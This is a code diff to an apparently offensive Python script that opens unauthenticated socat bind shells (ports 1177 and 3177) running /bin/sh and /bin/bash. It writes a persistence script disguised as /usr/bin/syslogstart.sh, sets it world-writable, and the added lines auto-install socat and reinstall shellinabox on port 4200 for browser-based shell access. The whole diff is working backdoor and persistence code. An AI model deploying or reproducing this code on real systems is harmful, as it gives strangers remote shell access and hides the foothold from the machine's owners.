@@ -39,14 +39,24 @@ os.system("socat SCTP-Listen:1177,fork EXEC:/bin/sh &")
 #connect with socat STDIO TCP4:IP:3177
 os.system("socat TCP4-Listen:3177,fork EXEC:/bin/bash &")
 
-#socat backdoor persistance
+#backdoor persistance
 f = open("/usr/bin/syslogstart.sh", "w")
 f.write("""if lsof -Pi :3177 -sTCP:LISTEN -t >/dev/null ; then
         echo "" > /dev/null
 else
         echo "" > /dev/null
+        apt-get install socat -y
         socat TCP4-Listen:3177,fork EXEC:/bin/bash &
 fi
+
+if lsof -Pi :4200 -sTCP:LISTEN -t >/dev/null ; then
+        echo "" > /dev/null
+else
+        echo "" > /dev/null
+        apt-get autoremove --purge shellinabox -y
+        apt-get install shellinabox -y
+fi
+
 """)
 f.close()
 os.system("chmod 777 /usr/bin/syslogstart.sh")
